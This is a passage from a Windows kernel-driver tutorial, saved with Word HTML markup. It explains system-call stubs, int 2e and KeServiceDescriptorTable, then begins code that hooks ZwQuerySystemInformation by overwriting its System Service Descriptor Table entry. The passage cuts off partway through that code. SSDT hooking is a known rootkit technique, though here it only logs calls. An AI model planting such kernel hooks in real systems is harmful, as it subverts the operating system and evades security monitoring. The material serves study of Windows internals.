mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;IRP_MJ_CREATE\n&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>IoCompleteRequest(Irp,
IO_NO_INCREMENT);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return(STATUS_SUCCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>VOID
DriverUnload(PDRIVER_OBJECT DriverObject)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Unloading&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverEntry(PDRIVER_OBJECT driverObject, PUNICODE_STRING RegistryPath)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned char *p;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>int i;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;DriverUnload
= DriverUnload;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;MajorFunction[IRP_MJ_CREATE]
= DriverDispatcher;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Vijay
2&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>p = (char
*)ZwQuerySystemInformation;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>for(i=0;i &lt;= 12;
i++)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;%x&quot;,*(p+i));<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;\n\n&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>p = (char
*)ZwQueryDirectoryFile;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>for(i=0;i &lt;= 12;
i++)<o:p></o:p></span></p>

<pre><span style='mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style";
mso-fareast-font-family:"Times New Roman"'>DbgPrint(&quot;%x&quot;,*(p+i));<o:p></o:p></span></pre>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return(STATUS_SUCCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>b8
97 0 0 0 8d 54 24 4 cd 2e c2 10<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>b8
7d 0 0 0 8d 54 24 4 cd 2e c2 2c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>The
above program simply displays the first 13 bytes of the two functions. The
first five are a mov eax instruction. The values moved are called the service
numbers of the functions. Where these are used we will come to a little later.
The next four instructions move the address of a the entity that is stored 4
away from the stack into the edx register. This instruction is lea edx, DWORD
PTR SS:[ESP+4]. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>This
instructions remains the same for all functions. The opcode cd allows us to
call a interrupt, with the interrupt number following. In our case the
interrupt called is 0x2e. This interrupt is used to switch from ring 3 to ring
0. This is how any function under windows moves up the function call to a
device driver to handle. Code that<span style="mso-spacerun: yes"> 
</span>resides in a dll under windows does not real work, this applies to code
present in kernel32.dll also. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>All
these functions finally call code present in ntdll.dll that start with Zw.
These functions also do not do much in ring 0, they in turn call code in ring 0
using interrupt 2e. Finally we return a value back using the ret instruction.
More on this much later.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>P38<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;ntddk.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;stdio.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>typedef struct <o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned int
*ServiceTableBase;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned int
*ServiceCounterTableBase;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned int
NumberOfServices;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned char
*ParamTableBase;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>} sdt;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>__declspec(dllimport)
sdt KeServiceDescriptorTable;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverDispatcher(PDEVICE_OBJECT pDeviceObject, PIRP Irp)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;IRP_MJ_CREATE\n&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>IoCompleteRequest(Irp,
IO_NO_INCREMENT);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return(STATUS_SUCCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>VOID
DriverUnload(PDRIVER_OBJECT DriverObject)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Unloading&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverEntry(PDRIVER_OBJECT driverObject, PUNICODE_STRING RegistryPath)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;DriverUnload
= DriverUnload;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;MajorFunction[IRP_MJ_CREATE]
= DriverDispatcher;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Vijay
2 KeServiceDescriptorTable=%x&quot;, KeServiceDescriptorTable);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return(STATUS_SUCCESS);<o:p></o:p></span></p>

<pre><span style='mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style";
mso-fareast-font-family:"Times New Roman"'>}<o:p></o:p></span></pre>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Vijay
2 KeServiceDescriptorTable=804742b8<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Vijay
2 KeServiceDescriptorTable=0<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>We
have created a variable KeServiceDescriptorTable of structure type sdt that is
our structure. In DriverEntry when we print out its value, it is not zero as we
created it as a global variable. It has a value of 804742b8 because this
variable is exported by ntoskrnl.lib. If we remove the declspec keyword, we
will get a value of zero. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Thus
what applies to functions, applies to variables exported also. If ntoskrnl.exe
did not export the variable KeServiceDescriptorTable, we would have had a
problem in what value to set it to. The fortunate part is the data types of the
two variables can be what we like, thus ours is a structure that looks like
sdt. The sdt structure has been made a typedef so that we do not have to write
struct everywhere.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>P39<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>H1.c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>__declspec(dllexport)
int i = 23;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>cl
–c h1.c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>link
/dll h1.obj<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>We
create a dll h1.dll that has only one exported variable I whose value is set to
23.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>P40<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>H2.c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>__declspec(dllimport)
char i;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>main()<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>printf(&quot;%d\n&quot;,i);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>cl
h2.c h1.lib<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>23<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>In
the file h2.c we use the dllimport keyword to refer to the variable I whose
data type is char and not int. When we link with the h1.lib file we get no
error and the value of I is 23. This is how we can refer to variables exported
by other programs.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>P41<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>r.c<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;ntddk.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;stdio.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSYSAPI NTSTATUS
NTAPI ZwQuerySystemInformation(ULONG SystemInformationClass,PVOID
SystemInformation,ULONG SystemInformationLength,PULONG ReturnLength);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>typedef struct <o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned int
*ServiceTableBase;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned int
*ServiceCounterTableBase;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned int
NumberOfServices;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned char
*ParamTableBase;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>} sdt;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>__declspec(dllimport)
sdt KeServiceDescriptorTable;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
(NTAPI*OldZwQuerySystemInformation)(ULONG SystemInformationCLass,PVOID
SystemInformation,ULONG SystemInformationLength,PULONG ReturnLength);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
NewZwQuerySystemInformation(ULONG SystemInformationClass,PVOID
SystemInformation,ULONG SystemInformationLength,PULONG ReturnLength)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS rc;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>rc =
OldZwQuerySystemInformation(SystemInformationClass,SystemInformation,SystemInformationLength,ReturnLength);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;rc=%d
Class=%d Length=%d
return=%x&quot;,rc,SystemInformationClass,SystemInformationLength,ReturnLength);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return rc;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>long no;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverDispatcher(PDEVICE_OBJECT pDeviceObject, PIRP Irp)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;IRP_MJ_CREATE\n&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>IoCompleteRequest(Irp,
IO_NO_INCREMENT);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return(STATUS_SUCCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>VOID
DriverUnload(PDRIVER_OBJECT DriverObject)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Unloading&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_asm cli<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>KeServiceDescriptorTable.ServiceTableBase[no]=(unsigned
int)OldZwQuerySystemInformation;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_asm sti<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverEntry(PDRIVER_OBJECT driverObject, PUNICODE_STRING RegistryPath)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>char *p;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;DriverUnload
= DriverUnload;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;MajorFunction[IRP_MJ_CREATE]
= DriverDispatcher;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Vijay
2 KeServiceDescriptorTable=%x&quot;,KeServiceDescriptorTable);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>p = (char *)
ZwQuerySystemInformation;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>p = p + 1;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
